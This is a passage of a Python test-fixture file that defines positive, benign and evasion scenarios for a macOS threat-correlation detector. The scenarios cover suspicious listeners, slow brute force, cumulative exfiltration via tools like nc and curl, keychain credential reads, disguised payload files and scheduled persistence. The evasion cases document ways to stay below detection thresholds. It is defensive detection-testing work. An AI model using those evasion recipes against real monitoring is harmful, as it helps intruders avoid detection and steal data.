        mitre_tactics=["command-and-control"],
        probe_factory=UnknownListenerProbe,
        cases=[
            # POS: unknown process on port 4444 (classic reverse shell)
            AdversarialCase(
                id="corr_ul_port_4444",
                title="Unknown process listening on port 4444",
                category="positive",
                description="Classic reverse shell / Metasploit handler port",
                why="Port 4444 in _SUSPICIOUS_PORTS + unknown process = CRITICAL",
                events=[
                    _conn(
                        pid=10001,
                        process_name="handler",
                        state="LISTEN",
                        local_ip="0.0.0.0",
                        local_port=4444,
                    )
                ],
                shared_data_key="connections",
                expect_count=1,
                expect_event_types=["corr_unknown_listener"],
                expect_severity=Severity.CRITICAL,
            ),
            # POS: unknown process on port 9090
            AdversarialCase(
                id="corr_ul_port_9090",
                title="Unknown process listening on port 9090",
                category="positive",
                description="Suspicious C2 management port",
                why="Port 9090 in _SUSPICIOUS_PORTS",
                events=[
                    _conn(
                        pid=10002,
                        process_name="c2panel",
                        state="LISTEN",
                        local_ip="0.0.0.0",
                        local_port=9090,
                    )
                ],
                shared_data_key="connections",
                expect_count=1,
                expect_event_types=["corr_unknown_listener"],
                expect_severity=Severity.CRITICAL,
            ),
            # POS: unknown on privileged port (<1024)
            AdversarialCase(
                id="corr_ul_privileged_port",
                title="Unknown process on privileged port 80",
                category="positive",
                description="Non-httpd listening on port 80",
                why="Unknown process + privileged port <1024 = MEDIUM",
                events=[
                    _conn(
                        pid=10003,
                        process_name="implant",
                        state="LISTEN",
                        local_ip="0.0.0.0",
                        local_port=80,
                    )
                ],
                shared_data_key="connections",
                expect_count=1,
                expect_event_types=["corr_unknown_listener"],
                expect_severity=Severity.MEDIUM,
            ),
            # BENIGN: nginx on port 80 (known-good)
            AdversarialCase(
                id="corr_ul_nginx_80",
                title="nginx listening on port 80 (known-good)",
                category="benign",
                description="nginx on port 80 is expected",
                why="'nginx' in _KNOWN_LISTENERS, port 80 in allowed set",
                events=[
                    _conn(
                        pid=10004,
                        process_name="nginx",
                        state="LISTEN",
                        local_ip="0.0.0.0",
                        local_port=80,
                    )
                ],
                shared_data_key="connections",
                expect_count=0,
                expect_evades=True,
            ),
            # BENIGN: ESTABLISHED state (not LISTEN)
            AdversarialCase(
                id="corr_ul_established_state",
                title="Connection on port 4444 but ESTABLISHED (not LISTEN)",
                category="benign",
                description="Only LISTEN state triggers this probe",
                why="state != LISTEN → skip",
                events=[
                    _conn(
                        pid=10005,
                        process_name="handler",
                        state="ESTABLISHED",
                        remote_ip="45.33.32.1",
                        remote_port=4444,
                    )
                ],
                shared_data_key="connections",
                expect_count=0,
                expect_evades=True,
            ),
            # EVASION: high ephemeral port (not suspicious, not privileged)
            AdversarialCase(
                id="corr_ul_high_port",
                title="Unknown process on port 12345 (non-suspicious, non-privileged)",
                category="evasion",
                description="Attacker uses non-standard non-flagged port",
                why="Port 12345 not in _SUSPICIOUS_PORTS and >= 1024 → skip",
                events=[
                    _conn(
                        pid=10006,
                        process_name="backdoor",
                        state="LISTEN",
                        local_ip="0.0.0.0",
                        local_port=12345,
                    )
                ],
                shared_data_key="connections",
                expect_count=0,
                expect_evades=True,
            ),
        ],
    )
)


# =============================================================================
# 7. CumulativeAuth — slow brute force across scans
# =============================================================================

register(
    Scenario(
        probe_id="macos_corr_cumulative_auth",
        agent="macos_correlation",
        name="macos_corr_cumulative_auth",
        title="Cumulative auth failures across collection windows",
        description="Rolling 5-minute window catches slow brute force that stays below per-scan thresholds.",
        mitre_techniques=["T1110", "T1078"],
        mitre_tactics=["credential-access", "initial-access"],
        probe_factory=CumulativeAuthProbe,
        cases=[
            # POS: rolling SSH failures >= 5
            AdversarialCase(
                id="corr_ca_ssh_cumulative",
                title="Cumulative 7 SSH failures from same IP across scans",
                category="positive",
                description="Attacker spreads brute force across multiple scan windows",
                why="rolling.total('ssh_fail:10.0.0.1') = 7 >= threshold 5",
                events=[],
                shared_data_key="auth_events",
                extra_context={
                    "rolling": _rolling_with(
                        ("ssh_fail:10.0.0.1", 3.0),
                        ("ssh_fail:10.0.0.1", 2.0),
                        ("ssh_fail:10.0.0.1", 2.0),
                    ),
                },
                expect_count=1,
                expect_event_types=["corr_cumulative_ssh_brute"],
                expect_severity=Severity.HIGH,
            ),
            # POS: rolling account lockout >= 10
            AdversarialCase(
                id="corr_ca_lockout_cumulative",
                title="Cumulative 12 auth failures for user across scans",
                category="positive",
                description="Account lockout via cumulative failures",
                why="rolling.total('auth_fail:admin') = 12 >= threshold 10",
                events=[],
                shared_data_key="auth_events",
                extra_context={
                    "rolling": _rolling_with(
                        ("auth_fail:admin", 4.0),
                        ("auth_fail:admin", 4.0),
                        ("auth_fail:admin", 4.0),
                    ),
                },
                expect_count=1,
                expect_event_types=["corr_cumulative_lockout"],
                expect_severity=Severity.HIGH,
            ),
            # POS: both SSH + lockout from different vectors
            AdversarialCase(
                id="corr_ca_combined_brute",
                title="SSH brute force + account lockout simultaneously",
                category="positive",
                description="Attacker brute forces SSH while also targeting local accounts",
                why="rolling has both ssh_fail >= 5 and auth_fail >= 10",
                events=[],
                shared_data_key="auth_events",
                extra_context={
                    "rolling": _rolling_with(
                        ("ssh_fail:10.0.0.5", 6.0),
                        ("auth_fail:root", 5.0),
                        ("auth_fail:root", 6.0),
                    ),
                },
                expect_count=2,
                expect_event_types=[
                    "corr_cumulative_ssh_brute",
                    "corr_cumulative_lockout",
                ],
                expect_severity=Severity.HIGH,
            ),
            # BENIGN: under threshold
            AdversarialCase(
                id="corr_ca_under_threshold",
                title="3 SSH failures (under threshold of 5)",
                category="benign",
                description="Legitimate typo — not enough failures",
                why="rolling.total('ssh_fail:10.0.0.2') = 3 < 5",
                events=[],
                shared_data_key="auth_events",
                extra_context={
                    "rolling": _rolling_with(
                        ("ssh_fail:10.0.0.2", 1.0),
                        ("ssh_fail:10.0.0.2", 1.0),
                        ("ssh_fail:10.0.0.2", 1.0),
                    ),
                },
                expect_count=0,
                expect_evades=True,
            ),
            # BENIGN: no rolling window data
            AdversarialCase(
                id="corr_ca_empty_rolling",
                title="Empty rolling window (no failures)",
                category="benign",
                description="No failures tracked",
                why="No keys in rolling window → 0 events",
                events=[],
                shared_data_key="auth_events",
                extra_context={"rolling": _rolling_with()},
                expect_count=0,
                expect_evades=True,
            ),
            # EVASION: attacker uses 4 failures per IP, rotating IPs (all under threshold)
            AdversarialCase(
                id="corr_ca_rotating_ips",
                title="4 failures each from 3 different IPs (all under threshold)",
                category="evasion",
                description="Attacker distributes brute force across IPs to stay under per-IP threshold",
                why="Each IP has total <5 → no alert despite 12 total failures",
                events=[],
                shared_data_key="auth_events",
                extra_context={
                    "rolling": _rolling_with(
                        ("ssh_fail:10.0.0.10", 4.0),
                        ("ssh_fail:10.0.0.11", 4.0),
                        ("ssh_fail:10.0.0.12", 4.0),
                    ),
                },
                expect_count=0,
                expect_evades=True,
            ),
        ],
    )
)


# =============================================================================
# 8. CumulativeExfil — slow exfil across scans
# =============================================================================

register(
    Scenario(
        probe_id="macos_corr_cumulative_exfil",
        agent="macos_correlation",
        name="macos_corr_cumulative_exfil",
        title="Cumulative data exfiltration across collection windows",
        description="Rolling window catches slow exfiltration that stays below per-scan 10MB threshold.",
        mitre_techniques=["T1048"],
        mitre_tactics=["exfiltration"],
        probe_factory=CumulativeExfilProbe,
        cases=[
            # POS: cumulative 15MB exfil
            AdversarialCase(
                id="corr_ce_cumulative_15mb",
                title="Cumulative 15MB exfil across scans",
                category="positive",
                description="Attacker exfils 5MB per scan (3 scans) = 15MB total",
                why="rolling.total('bytes_out:curl') = 15MB >= 10MB threshold",
                events=[],
                shared_data_key="bandwidth",
                extra_context={
                    "rolling": _rolling_with(
                        ("bytes_out:curl", 5_000_000),
                        ("bytes_out:curl", 5_000_000),
                        ("bytes_out:curl", 5_000_000),
                    ),
                },
                expect_count=1,
                expect_event_types=["corr_cumulative_exfil"],
                expect_severity=Severity.HIGH,
            ),
            # POS: large single-burst exfil
            AdversarialCase(
                id="corr_ce_single_burst_20mb",
                title="Single burst 20MB exfil from one process",
                category="positive",
                description="Attacker exfils 20MB in a single scan window",
                why="rolling.total('bytes_out:nc') = 20MB >= 10MB",
                events=[],
                shared_data_key="bandwidth",
                extra_context={
                    "rolling": _rolling_with(("bytes_out:nc", 20_000_000)),
                },
                expect_count=1,
                expect_event_types=["corr_cumulative_exfil"],
                expect_severity=Severity.HIGH,
            ),
            # POS: multiple processes exfiling
            AdversarialCase(
                id="corr_ce_multi_process",
                title="Two processes each exfiling 6MB (12MB total per-process)",
                category="positive",
                description="Attacker uses two processes both exceeding threshold",
                why="rolling.total per process: scp=12MB, rsync=11MB, both >= 10MB",
                events=[],
                shared_data_key="bandwidth",
                extra_context={
                    "rolling": _rolling_with(
                        ("bytes_out:scp", 6_000_000),
                        ("bytes_out:scp", 6_000_000),
                        ("bytes_out:rsync", 5_500_000),
                        ("bytes_out:rsync", 5_500_000),
                    ),
                },
                expect_count=2,
                expect_event_types=["corr_cumulative_exfil"],
                expect_severity=Severity.HIGH,
            ),
            # BENIGN: under 10MB cumulative
            AdversarialCase(
                id="corr_ce_under_threshold",
                title="Cumulative 8MB (under 10MB threshold)",
                category="benign",
                description="Normal upload activity",
                why="rolling.total = 8MB < 10MB",
                events=[],
                shared_data_key="bandwidth",
                extra_context={
                    "rolling": _rolling_with(
                        ("bytes_out:git", 4_000_000),
                        ("bytes_out:git", 4_000_000),
                    ),
                },
                expect_count=0,
                expect_evades=True,
            ),
            # BENIGN: empty rolling
            AdversarialCase(
                id="corr_ce_empty",
                title="No bandwidth data",
                category="benign",
                description="No data tracked",
                why="Empty rolling window",
                events=[],
                shared_data_key="bandwidth",
                extra_context={"rolling": _rolling_with()},
                expect_count=0,
                expect_evades=True,
            ),
            # EVASION: attacker splits across many processes, each under threshold
            AdversarialCase(
                id="corr_ce_split_processes",
                title="9MB each across 3 processes (all under 10MB threshold)",
                category="evasion",
                description="Attacker distributes exfil across processes to stay under per-process threshold",
                why="Each process has <10MB despite 27MB total",
                events=[],
                shared_data_key="bandwidth",
                extra_context={
                    "rolling": _rolling_with(
                        ("bytes_out:proc_a", 9_000_000),
                        ("bytes_out:proc_b", 9_000_000),
                        ("bytes_out:proc_c", 9_000_000),
                    ),
                },
                expect_count=0,
                expect_evades=True,
            ),
        ],
    )
)


# =============================================================================
# 9. KillChain — multi-tactic progression
# =============================================================================

register(
    Scenario(
        probe_id="macos_corr_kill_chain",
        agent="macos_correlation",
        name="macos_corr_kill_chain",
        title="Multi-tactic attack progression across agents",
        description="Detects coordinated attacks spanning 3+ MITRE tactics in a single collection cycle.",
        mitre_techniques=["T1059", "T1071", "T1543", "T1078", "T1048"],
        mitre_tactics=[
            "execution",
            "persistence",
            "credential-access",
            "lateral-movement",
            "exfiltration",
            "command-and-control",
        ],
        probe_factory=KillChainProgressionProbe,
        cases=[
            # POS: 4 tactics active → CRITICAL
            AdversarialCase(
                id="corr_kc_four_tactics",
                title="4 tactics active: execution + persistence + lateral + C2",
                category="positive",
                description="Full APT kill chain progression detected",
                why="4 tactics >= MIN_TACTICS=3 → CRITICAL",
                events=[
                    # execution: LOLBin running
                    _proc(
                        pid=11001,
                        name="curl",
                        exe="/usr/bin/curl",
                        process_guid="kc001",
                    ),
                ],
                shared_data_key="processes",
                extra_context={
                    # persistence: run_at_load LaunchAgent
                    "entries": [_pentry(run_at_load=True)],
                    # lateral: SSH to internal
                    "connections": [
                        _conn(
                            pid=11002,
                            process_name="ssh",
                            state="ESTABLISHED",
                            remote_ip="192.168.1.50",
                            remote_port=22,
                        ),
                        # C2: 3+ external from same PID
                        _conn(
                            pid=11001,
                            process_name="curl",
                            state="ESTABLISHED",
                            remote_ip="185.220.101.42",
                            remote_port=443,
                        ),
                        _conn(
                            pid=11001,
                            process_name="curl",
                            state="ESTABLISHED",
                            remote_ip="185.220.101.42",
                            remote_port=8443,
                        ),
                        _conn(
                            pid=11001,
                            process_name="curl",
                            state="ESTABLISHED",
                            remote_ip="185.220.101.42",
                            remote_port=8080,
                        ),
                    ],
                    "auth_events": [],
                    "files": [],
                    "bandwidth": [],
                },
                expect_count=1,
                expect_event_types=["corr_kill_chain_progression"],
                expect_severity=Severity.CRITICAL,
            ),
            # POS: 3 tactics → HIGH
            AdversarialCase(
                id="corr_kc_three_tactics",
                title="3 tactics active: execution + persistence + credential",
                category="positive",
                description="Active attack in progress",
                why="3 tactics == MIN_TACTICS=3 → HIGH",
                events=[
                    _proc(
                        pid=11003,
                        name="python3",
                        exe="/usr/bin/python3",
                        process_guid="kc002",
                    ),
                ],
                shared_data_key="processes",
                extra_context={
                    "entries": [_pentry(run_at_load=True)],
                    "connections": [],
                    "auth_events": [
                        _auth(category="keychain", message="find-generic-password")
                    ],
                    "files": [],
                    "bandwidth": [],
                },
                expect_count=1,
                expect_event_types=["corr_kill_chain_progression"],
                expect_severity=Severity.HIGH,
            ),
            # POS: 5 tactics active → CRITICAL (full compromise)
            AdversarialCase(
                id="corr_kc_five_tactics",
                title="5 tactics: execution + persistence + credential + lateral + exfil",
                category="positive",
                description="Full-spectrum compromise detected",
                why="5 tactics >= MIN_TACTICS=3 → CRITICAL",
                events=[
                    _proc(
                        pid=11006,
                        name="python3",
                        exe="/usr/bin/python3",
                        process_guid="kc005",
                    ),
                ],
                shared_data_key="processes",
                extra_context={
                    "entries": [_pentry(run_at_load=True)],
                    "connections": [
                        _conn(
                            pid=11006,
                            process_name="python3",
                            state="ESTABLISHED",
                            remote_ip="192.168.1.50",
                            remote_port=22,
                        ),
                    ],
                    "auth_events": [
                        _auth(category="keychain", message="find-generic-password")
                    ],
                    "files": [],
                    "bandwidth": [
                        _bw(pid=11006, process_name="python3", bytes_out=15_000_000)
                    ],
                },
                expect_count=1,
                expect_event_types=["corr_kill_chain_progression"],
                expect_severity=Severity.CRITICAL,
            ),
            # BENIGN: only 2 tactics → under threshold
            AdversarialCase(
                id="corr_kc_two_tactics",
                title="Only 2 tactics: execution + persistence (under threshold)",
                category="benign",
                description="Legitimate activity — installer running with autostart",
                why="2 < MIN_TACTICS=3 → no alert",
                events=[
                    _proc(
                        pid=11004,
                        name="ruby",
                        exe="/usr/bin/ruby",
                        process_guid="kc003",
                    ),
                ],
                shared_data_key="processes",
                extra_context={
                    "entries": [_pentry(run_at_load=True)],
                    "connections": [],
                    "auth_events": [],
                    "files": [],
                    "bandwidth": [],
                },
                expect_count=0,
                expect_evades=True,
            ),
            # BENIGN: no suspicious signals
            AdversarialCase(
                id="corr_kc_clean",
                title="Clean system — no suspicious signals",
                category="benign",
                description="Normal system with no attack indicators",
                why="0 tactics → no alert",
                events=[
                    _proc(
                        pid=11005,
                        name="Safari",
                        exe="/Applications/Safari.app/Contents/MacOS/Safari",
                        process_guid="kc004",
                    ),
                ],
                shared_data_key="processes",
                extra_context={
                    "entries": [],
                    "connections": [],
                    "auth_events": [],
                    "files": [],
                    "bandwidth": [],
                },
                expect_count=0,
                expect_evades=True,
            ),
            # EVASION: attacker executes across different scan windows (temporal separation)
            AdversarialCase(
                id="corr_kc_temporal_separation",
                title="Only 2 tactics per scan — attacker paces to stay under threshold",
                category="evasion",
                description="Attacker paces attack across scans so no single scan shows 3+ tactics",
                why="Only execution + persistence visible in this scan = 2 < 3",
                events=[
                    _proc(
                        pid=11007,
                        name="perl",
                        exe="/usr/bin/perl",
                        process_guid="kc006",
                    ),
                ],
                shared_data_key="processes",
                extra_context={
                    "entries": [_pentry(run_at_load=True)],
                    "connections": [],
                    "auth_events": [],
                    "files": [],
                    "bandwidth": [],
                },
                expect_count=0,
                expect_evades=True,
            ),
        ],
    )
)


# =============================================================================
# 10. FileSizeAnomaly — benign name, suspicious size
# =============================================================================

register(
    Scenario(
        probe_id="macos_corr_file_size_anomaly",
        agent="macos_correlation",
        name="macos_corr_file_size_anomaly",
        title="Benign filename with anomalous file size",
        description="Detects payload hiding in benign filenames (.DS_Store, .localized) via size anomaly.",
        mitre_techniques=["T1564"],
        mitre_tactics=["defense-evasion"],
        probe_factory=FileSizeAnomalyProbe,
        cases=[
            # POS: .DS_Store at 100KB (should be <32KB)
            AdversarialCase(
                id="corr_fsa_ds_store_large",
                title=".DS_Store at 100KB (expected <32KB)",
                category="positive",
                description="Payload hidden as .DS_Store",
                why="Size 102400 > max 32768 → anomaly",
                events=[_file(path="/tmp/.DS_Store", name=".DS_Store", size=102400)],
                shared_data_key="files",
                expect_count=1,
                expect_event_types=["corr_file_size_anomaly"],
                expect_severity=Severity.HIGH,
            ),
            # POS: .localized at 5KB (should be 0-1 bytes)
            AdversarialCase(
                id="corr_fsa_localized_large",
                title=".localized at 5KB (expected 0-1 bytes)",
                category="positive",
                description="Payload hidden as .localized file",
                why="Size 5120 > max 1 → anomaly",
                events=[_file(path="/tmp/.localized", name=".localized", size=5120)],
                shared_data_key="files",
                expect_count=1,
                expect_event_types=["corr_file_size_anomaly"],
            ),
            # POS: .com.apple.timemachine.donotpresent at 50KB (should be 0-1 bytes)
            AdversarialCase(
                id="corr_fsa_timemachine_large",
                title=".com.apple.timemachine.donotpresent at 50KB (expected 0-1 bytes)",
                category="positive",
                description="Payload hidden as Time Machine marker file",
                why="Size 51200 > max 1 → anomaly",
                events=[
                    _file(
                        path="/tmp/.com.apple.timemachine.donotpresent",
                        name=".com.apple.timemachine.donotpresent",
                        size=51200,
                    )
                ],
                shared_data_key="files",
                expect_count=1,
                expect_event_types=["corr_file_size_anomaly"],
            ),
            # BENIGN: normal .DS_Store (8KB)
            AdversarialCase(
                id="corr_fsa_ds_store_normal",
                title="Normal .DS_Store at 8KB",
                category="benign",
                description="Real .DS_Store is typically <32KB",
                why="Size 8192 <= max 32768 → normal",
                events=[
                    _file(path="/Users/testuser/.DS_Store", name=".DS_Store", size=8192)
                ],
                shared_data_key="files",
                expect_count=0,
                expect_evades=True,
            ),
            # BENIGN: unknown file name → not checked
            AdversarialCase(
                id="corr_fsa_unknown_name",
                title="Unknown file name (not in benign list)",
                category="benign",
                description="Random file not tracked for size anomaly",
                why="'payload.bin' not in _BENIGN_FILE_SIZES → skip",
                events=[
                    _file(path="/tmp/payload.bin", name="payload.bin", size=500000)
                ],
                shared_data_key="files",
                expect_count=0,
                expect_evades=True,
            ),
            # EVASION: payload uses untracked benign name (e.g. .gitignore)
            AdversarialCase(
                id="corr_fsa_untracked_benign_name",
                title="Payload named .gitignore (not in benign size map)",
                category="evasion",
                description="Attacker uses benign-looking filename not in the size map",
                why=".gitignore not in _BENIGN_FILE_SIZES → not checked",
                events=[_file(path="/tmp/.gitignore", name=".gitignore", size=500000)],
                shared_data_key="files",
                expect_count=0,
                expect_evades=True,
            ),
        ],
    )
)


# =============================================================================
# 11. ScheduledPersistence — at-jobs and expanded scheduling
# =============================================================================

register(
    Scenario(
        probe_id="macos_corr_scheduled_persistence",
        agent="macos_correlation",
        name="macos_corr_scheduled_persistence",
        title="Persistence via at-job, periodic script, or emond rule",
        description="Monitors at_job, periodic, and emond scheduling categories missed by CronProbe.",
        mitre_techniques=["T1053"],
        mitre_tactics=["persistence", "execution"],
        probe_factory=ScheduledPersistenceProbe,
        cases=[
            # Baseline
            AdversarialCase(
                id="corr_sp_baseline",
                title="Baseline: existing periodic scripts",
                category="benign",
                description="First scan — learn baseline",
                why="First run → baseline → 0 events",
                events=[
                    _pentry(
                        category="periodic",
                        path="/etc/periodic/daily/500.cleanup",
                        name="500.cleanup",
                        content_hash="clean123",
                    )
                ],
                shared_data_key="entries",
                stateful=True,
                expect_count=0,
                expect_evades=True,
            ),
            # POS: new at_job
            AdversarialCase(
                id="corr_sp_new_at_job",
                title="New at-job scheduled task",
                category="positive",
                description="Attacker creates at-job for persistence",
                why="at_job category + new entry → detected",
                events=[
                    _pentry(
                        category="periodic",
                        path="/etc/periodic/daily/500.cleanup",
                        name="500.cleanup",
                        content_hash="clean123",
                    ),
                    _pentry(
                        category="at_job",
                        path="/var/at/jobs/backdoor",
                        name="backdoor",
                        content_hash="evil456",
                        program="/tmp/evil.sh",
                    ),
                ],
                shared_data_key="entries",
                stateful=True,
                expect_count=1,
                expect_event_types=["corr_scheduled_persistence_new"],
                expect_severity=Severity.HIGH,
            ),
            # Chain break
            AdversarialCase(
                id="corr_sp_chain_break",
                title="Chain break",
                category="benign",
                description="Reset probe state",
                why="stateful=False",
                events=[],
                shared_data_key="entries",
                stateful=False,
                expect_count=0,
                expect_evades=True,
            ),
            # Baseline for emond test
            AdversarialCase(
                id="corr_sp_baseline2",
                title="Baseline: empty",
                category="benign",
                description="Second chain",
                why="First run → baseline",
                events=[],
                shared_data_key="entries",
                stateful=True,
                expect_count=0,
                expect_evades=True,
            ),
            # POS: new emond rule
            AdversarialCase(
                id="corr_sp_new_emond",
                title="New emond rule for persistence",
                category="positive",
                description="Attacker uses emond for event-driven persistence",
                why="emond category + new entry → detected",
                events=[
                    _pentry(
                        category="emond",
                        path="/etc/emond.d/rules/evil.plist",
                        name="evil.plist",
                        content_hash="emond789",
                    ),
                ],
                shared_data_key="entries",
                stateful=True,
                expect_count=1,
                expect_event_types=["corr_scheduled_persistence_new"],
            ),
            # Chain break 2
            AdversarialCase(
                id="corr_sp_chain_break2",
                title="Chain break 2",
                category="benign",
                description="Reset probe state",
                why="stateful=False",
                events=[],
                shared_data_key="entries",
                stateful=False,
                expect_count=0,
                expect_evades=True,
            ),
            # Baseline for periodic test
            AdversarialCase(
                id="corr_sp_baseline3",
                title="Baseline: empty",
                category="benign",
                description="Third chain",
                why="First run → baseline",
                events=[],
                shared_data_key="entries",
                stateful=True,
                expect_count=0,
                expect_evades=True,
            ),
            # POS: new periodic script
            AdversarialCase(
                id="corr_sp_new_periodic",
                title="New periodic daily script for persistence",
                category="positive",
                description="Attacker adds periodic script to run daily",
                why="periodic category + new entry → detected",
                events=[
                    _pentry(
                        category="periodic",
                        path="/etc/periodic/daily/999.backdoor",
                        name="999.backdoor",
                        content_hash="periodic789",
                        program="/tmp/daily_beacon.sh",
                    ),
                ],
                shared_data_key="entries",
                stateful=True,
                expect_count=1,
                expect_event_types=["corr_scheduled_persistence_new"],
                expect_severity=Severity.HIGH,
            ),
            # BENIGN: cron category (handled by CronProbe, not us)
            AdversarialCase(
                id="corr_sp_cron_ignored",
                title="Cron entry (handled by CronProbe, not ScheduledPersistenceProbe)",
                category="benign",
                description="CronProbe handles cron category",
                why="category 'cron' not in _TARGET_CATEGORIES → skip",
                events=[
                    _pentry(
                        category="cron",
                        path="/var/at/tabs/testuser",
                        name="testuser",
                        content_hash="cron123",
                    )
                ],
                shared_data_key="entries",
                stateful=True,
                expect_count=0,
                expect_evades=True,
            ),
            # EVASION: attacker uses launchagent category (handled by LaunchAgentProbe, not us)
            AdversarialCase(
                id="corr_sp_launchagent_ignored",
                title="LaunchAgent entry (handled by LaunchAgentProbe, not ScheduledPersistenceProbe)",
                category="evasion",
                description="Attacker uses LaunchAgent persistence which isn't covered by this probe",
                why="category 'launchagent_user' not in _TARGET_CATEGORIES → invisible here",
                events=[
                    _pentry(
                        category="launchagent_user",
                        path="~/Library/LaunchAgents/com.evil.plist",
                        name="com.evil.plist",
                        content_hash="la_evil",
                    )
                ],
                shared_data_key="entries",
                stateful=True,
                expect_count=0,
                expect_evades=True,
            ),
        ],
    )
)


# =============================================================================
# 12. AuthGeoAnomaly — new source IP
# =============================================================================

register(
    Scenario(
        probe_id="macos_corr_auth_geo_anomaly",
        agent="macos_correlation",
        name="macos_corr_auth_geo_anomaly",
        title="SSH login from previously unseen source IP",
        description="Baseline-diff on SSH source IPs detects logins from new locations regardless of time.",
        mitre_techniques=["T1078"],
        mitre_tactics=["initial-access"],
        probe_factory=AuthGeoAnomalyProbe,
        cases=[
            # Baseline: known IPs
            AdversarialCase(
                id="corr_ag_baseline",
                title="Baseline: known SSH source IPs",
                category="benign",
                description="First scan — learn known IPs",
                why="First run → baseline → 0 events",
                events=[
                    _auth(
                        category="ssh",
                        event_type="success",
                        source_ip="10.0.0.1",
                        process="sshd",
                    ),
                ],
                shared_data_key="auth_events",
                stateful=True,
                expect_count=0,
                expect_evades=True,
            ),
            # POS: new external source IP
            AdversarialCase(
                id="corr_ag_new_external_ip",
                title="SSH login from new external IP",
                category="positive",
                description="Login from previously unseen external IP",
                why="203.0.113.50 not in baseline → HIGH (external IP)",
                events=[
                    _auth(
                        category="ssh",
                        event_type="success",
                        source_ip="203.0.113.50",
                        process="sshd",
                    ),
                ],
                shared_data_key="auth_events",
                stateful=True,
                expect_count=1,
                expect_event_types=["corr_auth_new_source"],
                expect_severity=Severity.HIGH,
            ),
            # Chain break
            AdversarialCase(
                id="corr_ag_chain_break",
                title="Chain break",
                category="benign",
                description="Reset probe state",
                why="stateful=False",
                events=[],
                shared_data_key="auth_events",
                stateful=False,
                expect_count=0,
                expect_evades=True,
            ),
            # Baseline for private IP test
            AdversarialCase(
                id="corr_ag_baseline2",
                title="Baseline: empty",
                category="benign",
                description="Second chain",
                why="First run → baseline",
                events=[],
                shared_data_key="auth_events",
                stateful=True,
                expect_count=0,
                expect_evades=True,
            ),
            # POS: new private source IP → MEDIUM
            AdversarialCase(
                id="corr_ag_new_private_ip",
                title="SSH login from new private IP",
                category="positive",
                description="Login from new internal IP (less suspicious)",
                why="192.168.1.100 not in baseline → MEDIUM (private IP)",
                events=[
                    _auth(
                        category="ssh",
                        event_type="success",
                        source_ip="192.168.1.100",
                        process="sshd",
                    ),
                ],
                shared_data_key="auth_events",
                stateful=True,
                expect_count=1,
                expect_event_types=["corr_auth_new_source"],
                expect_severity=Severity.MEDIUM,
            ),
            # Chain break 2
            AdversarialCase(
                id="corr_ag_chain_break2",
                title="Chain break 2",
                category="benign",
                description="Reset probe state",
                why="stateful=False",
                events=[],
                shared_data_key="auth_events",
                stateful=False,
                expect_count=0,
                expect_evades=True,
            ),
            # Baseline for 3rd positive
            AdversarialCase(
                id="corr_ag_baseline3",
                title="Baseline: known office IPs",
                category="benign",
                description="Third chain — office IP baseline",
                why="First run → baseline",
                events=[
                    _auth(
                        category="ssh",
                        event_type="success",
                        source_ip="10.1.1.1",
                        process="sshd",
                    ),
                ],
                shared_data_key="auth_events",
                stateful=True,
                expect_count=0,
                expect_evades=True,
            ),
            # POS: login from completely new external IP after established baseline
            AdversarialCase(
                id="corr_ag_new_foreign_ip",
                title="SSH from unknown foreign IP after stable baseline",
                category="positive",
                description="Login from IP never seen before — potential compromised creds",
                why="198.51.100.77 not in baseline → HIGH (external IP)",
                events=[
                    _auth(
                        category="ssh",
                        event_type="success",
                        source_ip="198.51.100.77",
                        process="sshd",
                    ),
                ],
                shared_data_key="auth_events",
                stateful=True,
                expect_count=1,
                expect_event_types=["corr_auth_new_source"],
                expect_severity=Severity.HIGH,
            ),
            # BENIGN: failed login (not success) → skip
            AdversarialCase(
                id="corr_ag_failed_login",
                title="Failed SSH login (not successful auth)",
                category="benign",
                description="Only successful logins from new IPs matter",
                why="event_type='failure' → not tracked",
                events=[
                    _auth(
                        category="ssh",
                        event_type="failure",
                        source_ip="45.33.32.1",
                        process="sshd",
                    ),
                ],
                shared_data_key="auth_events",
                stateful=True,
                expect_count=0,
                expect_evades=True,
            ),
            # EVASION: attacker uses VPN with known-baseline IP
            AdversarialCase(
                id="corr_ag_vpn_known_ip",
                title="Attacker VPNs through previously seen source IP",
                category="evasion",
                description="Attacker routes through IP already in baseline",
                why="10.1.1.1 already in baseline from baseline3 → no alert",
                events=[
                    _auth(
                        category="ssh",
                        event_type="success",
                        source_ip="10.1.1.1",
                        process="sshd",
                    ),
                ],
                shared_data_key="auth_events",
                stateful=True,
                expect_count=0,
                expect_evades=True,
            ),
        ],
    )
)
